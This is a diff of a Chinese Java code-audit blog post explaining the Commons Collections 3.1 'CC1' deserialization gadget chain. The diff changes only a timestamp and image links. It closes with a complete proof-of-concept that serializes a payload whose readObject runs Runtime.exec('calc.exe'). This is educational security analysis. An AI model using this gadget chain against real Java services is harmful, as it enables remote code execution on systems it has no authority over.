@@ -46,7 +46,7 @@
 <meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W5N02t.png">
 <meta property="og:image" content="https://z3.ax1x.com/2021/07/27/W5kr2q.png">
 <meta property="article:published_time" content="2021-07-27T07:16:45.000Z">
-<meta property="article:modified_time" content="2021-07-27T09:51:37.579Z">
+<meta property="article:modified_time" content="2021-07-28T01:53:18.026Z">
 <meta property="article:author" content="TeaBo">
 <meta property="article:tag" content="java代码审计">
 <meta name="twitter:card" content="summary">
@@ -224,77 +224,77 @@
         <h2 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a><a id="more"></a>验证漏洞</h2><p>pom.xml添加cc1</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.1&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>
 
-<p><a href="https://imgtu.com/i/W45Joj" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W45Joj.png" alt="W45Joj.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W45Joj.png" alt="W45Joj.png"></a></p>
 <h2 id="CC1分析"><a href="#CC1分析" class="headerlink" title="CC1分析"></a>CC1分析</h2><p>我将整个分析过程分成两部分，一部分是构造命令执行，另一部分是触发链。</p>
 <h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>Transformer接口类，供后续其他类重写利用</p>
-<p><a href="https://imgtu.com/i/W4IA10" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4IA10.png" alt="W4IA10.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4IA10.png" alt="W4IA10.png"></a></p>
 <h5 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h5><p>直接返回构造函数传进来的Object</p>
-<p><a href="https://imgtu.com/i/W4I31x" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4I31x.png" alt="W4I31x.png"></a></p>
-<h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p><a href="https://imgtu.com/i/W4IbbF" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4IbbF.png" alt="W4IbbF.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4I31x.png" alt="W4I31x.png"></a></p>
+<h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4IbbF.png" alt="W4IbbF.png"></a></p>
 <p>可以看到这里 用getClass()获取了类，getMethod() 获取了方法， invoke反射执行。所以这里可以通过反射执行任意类的任意方法。</p>
 <p>Demo1:</p>
-<p><a href="https://imgtu.com/i/W4oCDO" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4oCDO.png" alt="W4oCDO.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4oCDO.png" alt="W4oCDO.png"></a></p>
 <p>成功利用<code>InvokerTransformer.transform</code>执行命令，但是这里是手动传入<code>Runtime.getRuntime()</code>来执行命令的，为了在反序列化时能被触发，我们还需找另一种自动构造的方法。</p>
-<h5 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h5><p><a href="https://imgtu.com/i/W4TuWR" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4TuWR.png" alt="W4TuWR.png"></a></p>
+<h5 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h5><p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4TuWR.png" alt="W4TuWR.png"></a></p>
 <p>可以看到在这里的<code>chainedTransformer.transform</code>里是可以循环触发<code>transform</code>，参数可控，并且第一次的值再传递给第二次调用</p>
 <p>因此可通过其来构造一条InvokerTransformer链子。</p>
 <p>(<em>new class[0] 用来告诉反射getMethod找到一个无参函数， new Object[0] 是为了根据传入参数自动获取类型，这里代替Null。这里之所以放这两个东西，主要就是类似占位符，因为反射去调用getMethod()时 ，它的构造函数要求传入两个参数。</em>)</p>
-<p><a href="https://imgtu.com/i/W4Tj6x" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4Tj6x.png" alt="W4Tj6x.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4Tj6x.png" alt="W4Tj6x.png"></a></p>
 <p>第一行通过<code>ConstantTransformer.transform</code>返回<code>java.lang.Runtime</code></p>
-<p><a href="https://imgtu.com/i/W47BC9" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W47BC9.png" alt="W47BC9.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W47BC9.png" alt="W47BC9.png"></a></p>
 <p>第二行通过<code>InvokerTransformer.transform</code>反射取得<code>getRuntime()</code></p>
 <p>第三行通过<code>invoke</code>反射取得<code>java.lang.Runtime.getRuntime()</code></p>
-<p><a href="https://imgtu.com/i/W4qcD0" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4qcD0.png" alt="W4qcD0.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4qcD0.png" alt="W4qcD0.png"></a></p>
 <p>最后一行直接反射调用<code>exec()</code>,并传入命令参数</p>
-<p><a href="https://imgtu.com/i/W4qz2d" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4qz2d.png" alt="W4qz2d.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4qz2d.png" alt="W4qz2d.png"></a></p>
 <h4 id="触发命令链"><a href="#触发命令链" class="headerlink" title="触发命令链"></a>触发命令链</h4><p>找在什么地方能调用到<code>ChainedTransformer</code>的<code>transform</code></p>
-<h5 id="TransformerMap"><a href="#TransformerMap" class="headerlink" title="TransformerMap"></a>TransformerMap</h5><p><a href="https://imgtu.com/i/W4Ldqx" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4Ldqx.png" alt="W4Ldqx.png"></a></p>
+<h5 id="TransformerMap"><a href="#TransformerMap" class="headerlink" title="TransformerMap"></a>TransformerMap</h5><p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4Ldqx.png" alt="W4Ldqx.png"></a></p>
 <p>在<code>decorate()</code>中实例化了<code>TransformedMap</code></p>
 <p>在transformValue()和checkSetValue(),transformKey()有调用 transform</p>
-<p><a href="https://imgtu.com/i/W4jka6" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4jka6.png" alt="W4jka6.png"></a></p>
-<p><a href="https://imgtu.com/i/W4OPSJ" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4OPSJ.png" alt="W4OPSJ.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4jka6.png" alt="W4jka6.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4OPSJ.png" alt="W4OPSJ.png"></a></p>
 <p><code>valueTransformer</code>参数可控，因此可以通过<code>TransformedMap.transformValue()</code>来触发<code>ChainedTransformer.transform()</code></p>
 <p>再找找看什么地方有这个transformValue()的调用</p>
 <p>在put方法中直接粗暴的就调用了</p>
-<p><a href="https://imgtu.com/i/W4XpHP" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4XpHP.png" alt="W4XpHP.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4XpHP.png" alt="W4XpHP.png"></a></p>
 <p>所以构造如下payload,直接Put时就执行命令</p>
-<p><a href="https://imgtu.com/i/W4XdUK" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4XdUK.png" alt="W4XdUK.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4XdUK.png" alt="W4XdUK.png"></a></p>
 <p>但是在反序列化漏洞环境中是从readObject()入手，所以需要另一种可以序列化构造的,在<code>readObject()</code>进入的payload</p>
 <h3 id="完整payload"><a href="#完整payload" class="headerlink" title="完整payload"></a>完整payload</h3><p>接下来是通过构造红框链来触发<code>chainedTransformer.transform()</code></p>
-<p><a href="https://imgtu.com/i/W4jjeI" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4jjeI.png" alt="W4jjeI.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4jjeI.png" alt="W4jjeI.png"></a></p>
 <h5 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h5><p><code>LazyMap</code> 和 <code>TransformMap</code>类似</p>
 <p>只不过 TransformMap 是<code>put</code>方法触发，而LazyMap是<code>get</code>方法</p>
-<p><a href="https://imgtu.com/i/W4v8mR" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4v8mR.png" alt="W4v8mR.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4v8mR.png" alt="W4v8mR.png"></a></p>
 <p>看到当key不存在为空时，则会调用transform(key)方法。</p>
 <p>将上一个payload的put改成<code>LazyMap::get</code> ,同样可以触发漏洞</p>
-<p><a href="https://imgtu.com/i/W4vdpD" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4vdpD.png" alt="W4vdpD.png"></a><a href="https://imgtu.com/i/W4vf1g" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4vf1g.png" alt="W4vf1g.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4vdpD.png" alt="W4vdpD.png"></a><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4vf1g.png" alt="W4vf1g.png"></a></p>
 <h5 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h5><p>在<code>D:\Java\Java1.7\JDK\jre\lib\rt.jar!\sun\reflect\annotation\AnnotationInvocationHandler.class</code> 中 利用 <code>AnnotationInvocationHandler</code>组件,它是用来处理注解的其构造函数有两个参数，一个是<code>Annotation</code>（Target.class == 元注解类） 另一个为<code>Map</code> （TransformedMap）。</p>
 <p>（JDK中，所以的注解类型都继承自这个Annotation）</p>
-<p><a href="https://imgtu.com/i/W4x1C8" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4x1C8.png" alt="W4x1C8.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4x1C8.png" alt="W4x1C8.png"></a></p>
 <p>重点看起readObject()</p>
-<p><a href="https://imgtu.com/i/W4xdU0" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4xdU0.png" alt="W4xdU0.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4xdU0.png" alt="W4xdU0.png"></a></p>
 <p>var1为传入的反序列化流，var2为该类构造函数传入的第一个Annotation值，var4为我们封装的<code>Map链.enrtySet().iterator()</code></p>
-<p><a href="https://imgtu.com/i/W5JrKU" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W5JrKU.png" alt="W5JrKU.png"></a></p>
-<p><a href="https://imgtu.com/i/W4zmzF" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4zmzF.png" alt="W4zmzF.png"></a><a href="https://imgtu.com/i/W4z4wn" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W4z4wn.png" alt="W4z4wn.png"></a></p>
-<p><a href="https://imgtu.com/i/W5Y8Rx" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W5Y8Rx.png" alt="W5Y8Rx.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W5JrKU.png" alt="W5JrKU.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4zmzF.png" alt="W4zmzF.png"></a><a href=""><img src="https://z3.ax1x.com/2021/07/27/W4z4wn.png" alt="W4z4wn.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W5Y8Rx.png" alt="W5Y8Rx.png"></a></p>
 <p>所以 最后<code>Map链.enrtySet().iterator()</code> 会返回<code>AbstractInputCheckedMapDecorator.java</code> 对象给var4，并将 Map链对象放进 <code>parent</code>.</p>
 <p>要注意 如何才能保证var7不为空，从而进入if分支</p>
-<p><a href="https://imgtu.com/i/W5STHA" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W5STHA.png" alt="W5STHA.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W5STHA.png" alt="W5STHA.png"></a></p>
 <p>已知var2为传入的注解类，var7为Map链。</p>
 <p>从 var5 var6 var7 var4 可知 要满足var7非空得满足以下2个条件：</p>
 <p>1.传入的var2 也就是注解类得有 member Type元素（也就是为什么传入Target.class的原因）</p>
-<p><a href="https://imgtu.com/i/W59L6S" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W59L6S.png" alt="W59L6S.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W59L6S.png" alt="W59L6S.png"></a></p>
 <p>2.put 进map的 key值 要与 memberTypes中的Key值相同</p>
-<p><a href="https://imgtu.com/i/W5iv0e" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W5iv0e.png" alt="W5iv0e.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W5iv0e.png" alt="W5iv0e.png"></a></p>
 <p>var5是<code>AbstractInputCheckedMapDecorator中MapEntry</code>类，所以最后 <code>var5.setValue</code>相当于调用了  <code>AbstractInputCheckedMapDecorator.MapEntry.setValue()</code></p>
-<p><a href="https://imgtu.com/i/W5FF6f" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W5FF6f.png" alt="W5FF6f.png"></a></p>
-<p><a href="https://imgtu.com/i/W5FJ74" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W5FJ74.png" alt="W5FJ74.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W5FF6f.png" alt="W5FF6f.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W5FJ74.png" alt="W5FJ74.png"></a></p>
 <p>这里的<code>parent</code>即是<code>TransformedMap</code>,相当于<code>TransformedMap-&gt;checkSetValue()</code></p>
 <p><code>TransformedMap</code>中的<code>valueTransformer</code>又等于<code>chainedTrasformer</code>链</p>
-<p><a href="https://imgtu.com/i/W5N02t" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W5N02t.png" alt="W5N02t.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W5N02t.png" alt="W5N02t.png"></a></p>
 <p>至此，就将readObject()和前面的链联系起来了</p>
 <p>最后模拟服务端通过 readObject 接收反序列化数据 直接RCE</p>
-<p><a href="https://imgtu.com/i/W5kr2q" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/07/27/W5kr2q.png" alt="W5kr2q.png"></a></p>
+<p><a href=""><img src="https://z3.ax1x.com/2021/07/27/W5kr2q.png" alt="W5kr2q.png"></a></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map transformedMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">       <span class="comment">// Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span></span><br><span class="line">        <span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">        <span class="comment">//onlyElement.setValue("foobar");</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//前面部分相同，此处开始使用AnnotationInvocationHandler</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">transformedMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line">        <span class="comment">//System.out.println(writeObject(instance));</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">        <span class="comment">//服务端反序列化</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>CC1链实际中用的不多，因为有限制。</p>
